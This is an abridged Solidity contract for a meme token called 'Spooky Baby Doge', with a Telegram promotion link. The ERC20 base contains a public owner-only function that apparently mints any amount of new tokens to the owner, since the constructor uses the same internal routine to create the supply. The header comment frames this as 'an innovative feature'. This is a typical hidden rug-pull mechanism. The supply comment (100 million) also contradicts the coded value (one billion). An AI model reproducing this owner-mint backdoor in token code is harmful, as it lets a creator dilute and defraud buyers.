...
//
// $SpookyBabyDoge proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpookyBabyDoge
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpookyBabyDoge(uint256 amount) public onlyOwner {
 _SpookyBabyDoge(msg.sender, amount);
    }
    ...
    function _SpookyBabyDoge(address account, uint256 amount) internal virtual {
...
contract $SpookyBabyDoge is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Spooky Baby Doge", "SBABYDOGE") {
     _SpookyBabyDoge(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}